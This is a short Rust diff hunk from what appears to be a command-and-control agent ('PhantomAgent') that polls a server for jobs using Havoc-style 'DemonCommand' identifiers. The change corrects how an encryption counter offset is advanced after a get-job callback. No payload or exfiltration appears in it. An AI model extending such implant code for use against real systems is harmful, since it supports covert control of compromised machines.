@@ -43,7 +43,7 @@ impl PhantomAgent {
         )?;
 
         let response = self.transport.send(&packet).await?;
-        self.ctr_offset += callback_ctr_blocks(0);
+        self.ctr_offset += callback_ctr_blocks(u32::from(DemonCommand::CommandGetJob), 0);
         self.callback_seq += 1;
 
         let (packages, next_offset) =
